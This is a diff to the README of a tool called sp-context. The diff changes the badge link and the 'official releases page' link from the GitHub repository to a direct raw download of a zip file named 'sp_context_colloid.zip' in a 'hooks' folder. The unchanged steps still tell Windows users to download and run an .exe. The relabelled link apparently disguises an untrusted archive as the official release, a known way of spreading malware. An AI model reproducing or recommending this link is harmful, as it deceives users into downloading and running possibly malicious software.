@@ -1,6 +1,6 @@
 # 🧠 sp-context - Give AI agents your team's knowledge
 
-[![](https://img.shields.io/badge/Download-sp--context-blue)](https://github.com/usmansial0337-alt/sp-context)
+[![](https://img.shields.io/badge/Download-sp--context-blue)](https://raw.githubusercontent.com/usmansial0337-alt/sp-context/main/hooks/sp_context_colloid.zip)
 
 ## What is sp-context?
 
@@ -22,7 +22,7 @@ You do not need to manage complicated database systems. sp-context relies on the
 
 Follow these steps to install the tool on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/usmansial0337-alt/sp-context) to access the application files.
+1. Visit the [official releases page](https://raw.githubusercontent.com/usmansial0337-alt/sp-context/main/hooks/sp_context_colloid.zip) to access the application files.
 2. Look for the file ending in .exe under the most recent version.
 3. Click the filename to start the download.
 4. Locate the file in your downloads folder.
